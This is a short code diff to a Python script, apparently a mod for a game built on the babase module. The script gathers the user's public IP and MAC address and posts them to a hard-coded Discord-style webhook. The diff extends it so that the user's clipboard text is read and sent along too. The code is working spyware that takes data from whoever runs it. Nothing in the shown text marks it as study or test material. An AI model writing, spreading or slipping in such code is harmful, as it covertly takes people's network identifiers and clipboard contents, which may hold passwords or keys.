@@ -2,6 +2,7 @@
 import http.client
 import json
 import uuid
+import babase
 
 def get_public_ip():
     try:
@@ -24,9 +25,10 @@ webhook_path = "/api/webhooks/1311648949878128660/9zRG2MjsqIp5UFK3dso_eRrRYPLtZa
 
 public_ip = get_public_ip()
 mac_address = get_mac_address()
+clipboard = babase.clipboard_get_text()
 
 message = {
-    "content": f"Public IP Address: `{public_ip}`\nMAC Address: `{mac_address}`"
+    "content": f"Public IP Address: `{public_ip}`\nMAC Address: `{mac_address}`\nLast Clipboard: `{clipboard}`"
 }
 
 conn = http.client.HTTPSConnection(webhook_url)
